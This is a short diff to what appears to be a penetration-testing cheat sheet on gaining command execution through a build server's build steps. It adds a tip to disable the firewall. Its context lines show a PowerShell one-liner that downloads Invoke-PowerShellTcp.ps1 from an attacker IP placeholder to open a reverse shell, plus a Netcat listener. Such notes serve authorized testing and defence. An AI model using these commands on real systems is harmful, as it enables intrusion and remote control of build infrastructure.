@@ -1867,6 +1867,7 @@ You can run system commands. There are many ways to do it:
     println "out> $sout err> $serr"
     ```
 - If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter: `powershell -c <command>`, or `powershell iex (iwr -UseBasicParsing http://<IP>/Invoke-PowerShellTcp.ps1);Power -Reverse -IPAddress <IP> -Port <PORT>`
+  - Disable the firewall or add an exception
 - Use a listener like Netcat `nc64.exe -lvp 443`
 
 
